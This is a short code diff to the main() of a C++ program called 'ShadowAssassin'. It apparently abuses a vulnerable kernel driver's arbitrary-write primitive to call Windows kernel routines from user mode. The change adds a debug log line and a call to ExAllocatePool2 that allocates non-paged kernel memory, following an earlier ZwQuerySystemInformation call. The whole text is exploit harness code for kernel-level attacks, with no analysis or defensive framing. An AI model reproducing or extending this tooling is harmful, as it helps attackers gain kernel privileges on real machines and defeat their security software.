@@ -3,6 +3,7 @@
 
 
 int main() {
+    DbgLog("[main] ShadowAssassin v1.0\n");
 
     VulnerableDriver driver;
     ShadowAssassin assassin;
@@ -13,6 +14,7 @@ int main() {
     assassin.SetWritePrimitive([&](UINT64 addr, UINT64 data) { driver.Write(addr, data); });
 
     if (!assassin.Initialize()) { driver.CleanUp(); return 1; }
+
 
 
 
@@ -28,6 +30,15 @@ int main() {
     UINT64 maxUserAddr = *(UINT64*)(outBuf + 0x28);
 
     printf("[ZwQuerySystemInformation] return=0x%llX  PageSize=0x%X  NumCpus=%u  MaxUserAddr=0x%llX\n", sysInfoResult, pageSize, numCpus, maxUserAddr);
+
+
+    // ExAllocatePool2(POOL_FLAGS, SIZE_T, ULONG Tag)
+    // POOL_FLAG_NON_PAGED = 0x40
+    UINT64 poolBuf = assassin.CallSyscall("ExAllocatePool2", { 0x40ULL, 256ULL, (UINT64)'1cbA' });
+    printf("[ExAllocatePool2] buffer=0x%llX\n", poolBuf);
+
+
+
 
     driver.CleanUp();
     DbgLog("[main] Done\n");
